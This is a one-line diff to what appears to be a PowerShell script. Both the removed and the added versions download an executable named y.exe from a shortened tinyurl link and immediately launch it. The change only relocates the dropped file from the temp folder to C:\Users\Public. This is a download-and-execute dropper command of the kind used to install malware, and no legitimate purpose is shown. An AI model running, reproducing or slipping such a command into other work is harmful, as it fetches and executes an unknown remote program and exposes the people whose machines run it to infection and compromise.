@@ -1,1 +1,1 @@
-(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/yk7nl72m','%TEMP%\y.exe'); Start-Process -FilePath %TEMP%\y.exe
+(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/yk7nl72m','C:\Users\Public\y.exe'); Start-Process -FilePath \Users\Public\y.exe
